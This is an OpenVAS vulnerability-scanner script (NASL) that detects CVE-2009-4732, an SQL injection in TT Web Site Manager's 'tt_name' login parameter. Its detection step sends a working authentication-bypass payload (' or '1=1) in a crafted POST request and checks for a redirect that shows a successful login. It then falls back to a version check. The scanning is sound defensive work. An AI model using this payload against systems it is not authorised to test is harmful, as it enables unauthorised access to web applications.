###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ttwm_sql_inj_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# TT Web Site Manager 'tt_name' Remote SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow execution of arbitrary SQL commands in
  the affected application.
  Impact Level: Application";
tag_affected = "TT Web Site Manager version 0.5 and prior.";
tag_insight = "The flaw is due to input validation error in the 'tt/index.php' script when
  processing the 'tt_name' parameter.";
tag_solution = "No solution or patch is available as of 19th March, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.technotoad.com/download.php";
tag_summary = "The host is running TT web site manager and is prone to SQL injection
  vulnerability.";

if(description)
{
  script_id(902135);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-03-23 15:59:14 +0100 (Tue, 23 Mar 2010)");
  script_cve_id("CVE-2009-4732");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("TT Web Site Manager 'tt_name' Remote SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/36129");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9336");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2009/2128");

  script_description(desc);
  script_copyright("Copyright (c) 2010 SecPod");
  script_summary("Check through the attack string and version of TT web site manager");
  script_category(ACT_MIXED_ATTACK);
  script_family("Web application abuses");
  script_dependencies("secpod_tt_website_manager_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

ttwmport = get_http_port(default:80);
if(!ttwmport){
  exit(0);
}

ttwmver = get_kb_item("www/" + ttwmport + "/TTWebsiteManager");
if(isnull(ttwmver)){
  exit(0);
}

ttwmver = eregmatch(pattern:"^(.+) under (/.*)$", string:ttwmver);
if(!isnull(ttwmver[2]))
{
  filename = string(ttwmver[2] + "/index.php");
  authVariables = "tt_name=admin+%27+or%27+1%3D1&tt_userpassword=admin+%27" +
                  "+or%27+1%3D1&action=Log+me+in";
  sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "Referer: http://", host, filename, "\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);
  rcvRes = http_send_recv(port:ttwmport, data:sndReq);
  if("location: ttsite.php" >< rcvRes)
  {
    security_hole(ttwmport);
    exit(0);
  }
}

if(!isnull(ttwmver[1]))
{
  # TT Website Manager version <= 0.5
   if(version_is_less_equal(version:ttwmver[1], test_version:"0.5")){
    security_hole(ttwmport);
  }
}
